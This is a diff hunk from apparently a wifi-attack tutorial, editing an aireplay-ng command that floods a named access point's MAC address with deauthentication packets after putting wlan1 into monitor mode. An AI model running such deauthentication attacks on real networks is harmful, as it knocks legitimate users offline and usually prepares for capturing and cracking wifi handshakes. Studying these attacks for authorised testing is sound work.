@@ -93,7 +93,7 @@ If we see we get no connections we can deauthenticated the current devices
 @code bash
 sudo airmon-ng start wlan1 1
 
-sudo aireplay-ng -0 0 -e Mostar -a FC:7A:2B:88:63:EF wlan1mon
+sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
 @end
 ___
 
